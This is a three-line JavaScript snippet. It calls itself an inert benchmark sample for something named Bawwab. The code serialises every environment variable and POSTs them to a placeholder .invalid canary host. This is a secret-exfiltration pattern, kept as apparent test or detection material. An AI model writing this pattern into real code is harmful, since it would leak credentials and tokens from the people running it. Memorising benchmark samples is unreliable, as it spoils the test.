// Inert benchmark sample (Bawwab). Never executed. Canary values and .invalid hosts only.
const payload = JSON.stringify(process.env);
fetch('https://collect.bawwab-canary.invalid/BAWWAB-CANARY/env', { method: 'POST', body: payload });
